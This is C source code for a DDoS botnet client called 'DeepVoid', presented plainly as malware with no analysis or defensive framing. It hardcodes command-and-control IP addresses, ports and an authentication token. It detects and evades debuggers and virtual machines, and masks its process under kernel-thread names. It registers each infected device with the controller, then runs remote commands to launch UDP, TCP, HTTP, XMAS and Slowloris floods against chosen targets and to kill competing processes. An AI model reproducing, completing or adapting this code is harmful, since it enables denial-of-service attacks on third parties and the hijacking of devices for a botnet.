#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <openssl/sha.h>
#include <sys/stat.h>
#include "killer.h"

#define SERVER_LIST_SIZE (sizeof(MainSocket))

// 𝖣𝖸𝖭𝖠𝖬𝖨𝖢 𝖢&𝖢 𝖢𝖮𝖭𝖥𝖨𝖦
char *bot_hosts[] = {"198.12.97.77", "185.62.58.93", "104.238.183.146"};
int bot_ports[] = {28, 1337, 8080};
int current_cnc = 0;
int cnc_count = 3;

uint32_t *pids;
uint64_t numpids = 0;
int MainSocket = 0;

// 𝖡𝖮𝖳 𝖠𝖴𝖳𝖧𝖤𝖭𝖳𝖨𝖢𝖠𝖳𝖨𝖮𝖭
char auth_token[64] = "DeepVoidSecureAuth2024";
char build_id[32] = {0};

// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸
void anti_analysis() {
    if(getenv("LD_PRELOAD") != NULL) _exit(0);
    if(getenv("PYTHONPATH") != NULL) _exit(0);
    if(getenv("DEBUG") != NULL) _exit(0);
    
    FILE *cpuinfo = fopen("/proc/cpuinfo", "r");
    if(cpuinfo) {
        char line[256];
        while(fgets(line, sizeof(line), cpuinfo)) {
            if(strstr(line, "hypervisor") || strstr(line, "QEMU") || 
               strstr(line, "VMware") || strstr(line, "VirtualBox")) {
                fclose(cpuinfo);
                _exit(0);
            }
        }
        fclose(cpuinfo);
    }
}

void hide_process() {
    char *fake_names[] = {
        "[kworker/0:0]", "[kworker/1:1]", "[ksoftirqd/0]", 
        "[migration/0]", "[rcu_sched]", "[watchdog/0]",
        "systemd-udevd", "systemd-journal", "systemd-timesyncd"
    };
    int name_index = rand() % (sizeof(fake_names)/sizeof(fake_names[0]));
    prctl(PR_SET_NAME, (unsigned long)fake_names[name_index], 0, 0, 0);
}

char *getBuild() {
#if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
#elif defined(__i386__) || defined(_M_IX86)
    return "x86";
#elif defined(__aarch64__)
    return "ARM64";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__)
    return "ARM7";
#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__)
    return "ARM6";
#elif defined(__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__)
    return "ARM5";
#elif defined(__mips__)
    return "MIPS";
#elif defined(__mipsel__)
    return "MIPSEL";
#elif defined(__powerpc__)
    return "PPC";
#else
    return "UNKNOWN";
#endif
}

void generate_bot_id(char *buffer, size_t len) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    char seed[512];
    snprintf(seed, sizeof(seed), "%s:%lu:%d:%s", hostname, time(NULL), getpid(), getBuild());
    
    SHA256_CTX ctx;
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, seed, strlen(seed));
    SHA256_Final(hash, &ctx);
    
    for(int i = 0; i < 16 && i*2 < len-1; i++) {
        sprintf(buffer + i*2, "%02x", hash[i]);
    }
}

void registermydevice(char *JoinName) {
    char registermsg[256];
    generate_bot_id(build_id, sizeof(build_id));
    
    sprintf(registermsg, "\e[0m\e[0;31m[\e[0;36mDeepVoid\e[0;31m]\e[0m Device Joined As [%s] Arch: [%s] ID: [%s]\r\n", 
            JoinName, getBuild(), build_id);
    if(MainSocket > 0) {
        write(MainSocket, registermsg, strlen(registermsg));
    }
}

int bot_authenticate(int sock) {
    char buffer[128];
    
    if(send(sock, auth_token, strlen(auth_token), MSG_NOSIGNAL) <= 0)
        return 0;
    
    fd_set fds;
    struct timeval tv;
    
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    
    if(select(sock + 1, &fds, NULL, NULL, &tv) <= 0)
        return 0;
    
    int len = recv(sock, buffer, sizeof(buffer)-1, 0);
    if(len <= 0) return 0;
    
    buffer[len] = 0;
    return (strstr(buffer, "AUTH_OK") != NULL);
}

int Connection(char *namezz) {
    struct sockaddr_in vSparkzyy;
    int attempts = 0;
    
    // 𝖱𝖮𝖳𝖠𝖳𝖤 𝖢&𝖢 𝖲𝖤𝖱𝖵𝖤𝖱𝖲
    current_cnc = (current_cnc + 1) % cnc_count;
    char *bot_host = bot_hosts[current_cnc];
    int bot_port = bot_ports[current_cnc];
    
retryme:
    MainSocket = socket(AF_INET, SOCK_STREAM, 0);
    if(MainSocket < 0) {
        sleep(5);
        attempts++;
        if(attempts < 10) goto retryme;
        return -1;
    }
    
    vSparkzyy.sin_family = AF_INET;
    vSparkzyy.sin_port = htons(bot_port);
    vSparkzyy.sin_addr.s_addr = inet_addr(bot_host);
    
    int check = connect(MainSocket, (struct sockaddr *)&vSparkzyy, sizeof(vSparkzyy));
    if(check == -1) {
        close(MainSocket);
        MainSocket = -1;
        attempts++;
        if(attempts < 10) {
            sleep(5);
            goto retryme;
        }
        return -1;
    }
    
    if(!bot_authenticate(MainSocket)) {
        close(MainSocket);
        MainSocket = -1;
        sleep(5);
        attempts++;
        if(attempts < 10) goto retryme;
        return -1;
    }
    
    registermydevice(namezz);
    return 0;
}

void proc_cmd(int argc, unsigned char **argv) {
    if(!strcmp(argv[0], "UDP")) {
        if(argc < 5) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]), time = atoi(argv[3]), packetsize = atoi(argv[4]);
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] UDP Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            udpattack(ip, port, time, packetsize);
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }
    
    if (!strcmp(argv[0], "HTTP")) {
        if (argc < 7) return;
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] HTTP Attack Sent\r\n");
            SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }

    if(!strcmp(argv[0], "TCP")) {
        if(argc < 5) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        unsigned char *flags = argv[4];
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] TCP Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            SendTCP(ip, port, time, flags);
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }

    if(!strcmp(argv[0], "STD")) {
        if(argc < 4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] STD Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            sendSTD(ip, port, time);
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }
    
    if(!strcmp(argv[0], "XMAS")) {
        if(argc < 4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] XMAS Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            xmas(ip, port, time);
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }
    
    if(!strcmp(argv[0], "SLOWLORIS")) {
        if(argc < 4) return;
        char *host = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        pid_t pid = fork();
        if(pid == 0) {
            printf("[DeepVoid] Slowloris Attack Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            send_slowloris(host, port, time);
            _exit(0);
        } else if(pid > 0) {
            return;
        }
        return;
    }
    
    if(strstr(argv[0], "hahawekillyou")) {
        printf("\r\n[DeepVoid] Disconnected! \r\n");
        kill_bk();
        _exit(0);
    }
    
    if(strstr(argv[0], "bkstop")) {
        printf("\r\n[DeepVoid] BotKiller Stopped! \r\n");
        kill_bk();
    }

    if(!strcmp(argv[0], "KT")) {
        int killed = 0;
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                killed++;
            }
        }
    }
}

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define LOCALHOST (inet_addr("127.0.0.1"))

void ensure_bind(uint32_t bind_addr) {
    int fd = -1;
    struct sockaddr_in addr;
    
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1) {
        return;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888);
    addr.sin_addr.s_addr = bind_addr;
    
    NONBLOCK(fd);
    
    int ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    int e = errno;
    
    if(ret == -1 && e == EADDRNOTAVAIL) {
        close(fd);
        sleep(1);
        ensure_bind(LOCALHOST);
        return;
    }
    
    if(ret == -1 && e == EADDRINUSE) {
        close(fd);
        _exit(1);
    }
    
    listen(fd, 1);
    close(fd);
}

uint32_t local_addr(void) {
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1) {
        return 0;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);
    
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    
    return addr.sin_addr.s_addr;
}

void recv_buf() {
    char buf[512];
    ssize_t bytes_read;
    
    while(MainSocket > 0 && (bytes_read = read(MainSocket, buf, sizeof(buf)-1)) > 0) {
        buf[bytes_read] = '\0';
        
        int r, argcount = 0;
        unsigned char *buffer[12 + 1] = {0};
        char *strr;
        
        for(strr = strtok(buf, " "); strr != NULL && argcount < 12; strr = strtok(NULL, " ")) {
            buffer[argcount] = malloc(strlen(strr) + 1);
            if(!buffer[argcount]) break;
            
            strcpy(buffer[argcount], strr);
            argcount++;
        }
        
        if(argcount > 0) {
            proc_cmd(argcount, buffer);
        }
        
        for(r = 0; r < argcount; r++) {
            if(buffer[r]) {
                free(buffer[r]);
            }
        }
        
        memset(buf, 0, sizeof(buf));
    }
}

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
        close(sock);
        return 0;
    }
    return sock;
}

int main(int argc, unsigned char * argv[]) {
    anti_analysis();
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    uint32_t local = local_addr();
    ensure_bind(local);
    
    // 𝖥𝖨𝖷𝖤𝖣 𝖥𝖮𝖱𝖪 𝖧𝖠𝖭𝖣𝖫𝖨𝖭𝖦
    pid_t pid = fork();
    if(pid > 0) _exit(0);
    if(pid < 0) _exit(1);
    
    hide_process();
    
    if (SERVER_LIST_SIZE <= 0) return 0;
    
    strncpy(argv[0], "", strlen(argv[0]));
    
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    
    int backoff = 1;
    while(1) {
        if(Connection(argv[1]) == -1) {
            sleep(backoff);
            backoff = (backoff < 300) ? backoff * 2 : 300;
            continue;
        }
        
        botkiller(MainSocket);
        recv_buf();
        
        if(MainSocket > 0) {
            close(MainSocket);
            MainSocket = -1;
        }
        sleep(5);
    }
    
    return 0;
}